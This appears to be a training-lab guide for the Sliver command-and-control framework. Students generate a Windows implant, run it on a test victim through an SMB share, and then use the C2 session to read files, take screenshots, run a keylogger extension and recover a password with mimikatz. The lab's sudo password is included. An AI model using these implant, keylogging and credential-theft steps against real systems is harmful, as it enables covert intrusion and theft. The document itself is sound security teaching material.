# Sliver Botnet Instructions

## Accessing your Servers
You have 2 servers in your lab:
* **sliver-server**: Ubuntu server with the role of command and control of the botnet.
* **sliver-victim**: A test victim server used for installing implants.

>! **Warning:** When connecting to servers, it may be best to open this in an incognito browser to avoid caching the credentials used to connect. Only connect to one of the servers at a time, and then, only in incognito mode.

![image](https://user-images.githubusercontent.com/50633591/234986130-619d61f1-1a5b-47e7-9efa-555311ccb725.png)

### Start and Run Sliver
If promted for the sudo password, enter in `Let's workout!`
```
sudo systemctl start sliver
sudo sliver
```
You should then see a prompt similar to the one below:
![image](https://github.com/emerginganalytics/cyberarena/assets/50633591/4e87efc9-669f-4d72-b099-308bf03cd49b)

### Generating the Implant
Run the following command to generate the botnet malware. This will take a few minutes and when it completes a new executable with an arbitrary name will be saved in the student directory indicated.
```
generate --mtls 10.1.1.10 --os windows --arch amd64 --format exe
```
When you create your implants, move them to the `/srv/sliver` folder on the Sliver server and change the permissions to allow execution in the commands below. Make sure you exist the sliver prompt by typing in `exit`.
```
cp ./<RANDOM_NAME>.exe /srv/sliver/
sudo chmod 777 /srv/sliver/<RANDOM_NAME>.exe
```
The `cp` command means copy and it copies the executable you just created to a directory /srv/sliver. For the nerds out there, a SAMBA server is running on the Ubuntu system that allows Windows systems to navigate to the executable using network shares.

Now you'll want to start the Botnet server so it will listen for the victim to communicate back to it. Run the following:
```
sudo sliver
sliver > mtls
```
Sliver is now waiting for clients to communicate back with it.

### Open your Victim Machine
Then, the malware can be accessed by your Windows server, sliver-victim, by opening a file explorer and navigating to `\\10.1.1.10\sliver`

Double click to run the executable. Nothing will happen, but the C2 backchannel communication will be established.

### Use Botnet Server
Go to the sliver-server and you should see a line like this:
```
[*] Session 40ecf1dd ...
```
This lets you know that a C2 channel is open to the victim. You can use this channel by typing:
```
use 1 (replace '1' with the first character of your session ID)
```
You can also list the sessions by typing `sessions` and find the session ID of the victim PC.

You can run commands similar to the following:
```
sliver (RANDOM_NAME) > info             # This will show you information about the remote PC
sliver (RANDOM_NAME) > execute calc     # Open the calculator application on the desktop
sliver (RANDOM_NAME) > execute notepad  # Open the notepad application on the desktop
```
Some other interesting commands:
```
sliver (RANDOM_NAME) > cat /users/cyberarena/sample.txt   # dumps the contents of a text file
sliver (RANDOM_NAME) > screenshot                         # Generate a current screenshot. You can move this to the /srv/sliver directory to view it
```

### Sliver Armory
The Sliver armory 
```
sudo sliver                               # If you're not already in the console.
sliver > armory install raw-keylogger     # Install a keylogger extension
sliver > user 1                           # Replace with the session ID
sliver (RANDOM_NAME) > raw-keylogger 1    # Starts the remote keylogger. You can go to the victim machine and type into a notepad.
sliver (RANDOM_NAME) > raw-keylogger 2    # Captures the keylogger output.
```
> **Challenge:** There's a secret password on the victim. See if you can use mimikatz through the Armory to recover the password.


